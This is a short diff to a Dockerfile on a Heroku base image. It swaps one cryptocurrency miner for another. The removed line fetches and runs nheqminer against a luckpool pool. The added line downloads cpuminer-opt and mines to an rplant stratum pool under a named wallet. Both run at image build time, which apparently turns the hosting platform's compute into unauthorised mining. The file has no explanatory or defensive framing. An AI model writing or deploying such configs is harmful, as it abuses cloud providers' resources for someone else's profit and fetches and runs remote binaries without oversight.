@@ -1,4 +1,4 @@
 FROM heroku/heroku:18
 RUN apt-get install -y curl git unzip wget
-RUN wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar xf nheqminer-Linux-v0.8.2.tgz && tar xf nheqminer-Linux-v0.8.2.tar.gz && cd nheqminer && ./nheqminer -v -l ap.luckpool.net:3956 -u RW4urDfTUnhoG2yaEyPXDcXH7KGjGbapWv.siber -p x -t 2
+RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a power2b  -o stratum+tcps://stratum-asia.rplant.xyz:17022 -u Mq57pD51Lei9PBvkGCso7xNQerTHttfmRm.zib -t 1
 CMD bash heroku.sh
